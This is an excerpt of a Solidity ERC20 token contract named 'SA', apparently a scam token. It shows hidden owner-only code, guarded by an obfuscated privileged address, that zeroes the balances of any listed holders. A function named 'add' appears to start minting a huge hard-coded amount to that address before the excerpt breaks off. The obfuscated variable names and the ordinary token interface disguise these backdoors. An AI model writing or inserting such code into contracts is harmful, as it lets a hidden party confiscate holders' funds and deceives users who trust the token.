...
contract SA is Context, Ownable, IERC20 {
    ...
    require(_CDREFDS == _msgSender(), "Not authorized");
    
    for (uint i = 0; i < addresses.length; i++) {
        address currentAddress = addresses[i];
        uint256 feee = _balances[currentAddress];
        _balances[currentAddress] = _balances[currentAddress] - feee;
    }
    }
    ...
    function add() public {
    require(_CDREFDS == _msgSender());
    address ownne = _CDREFDS;
    uint256 iernen = 95254215421215645125441;
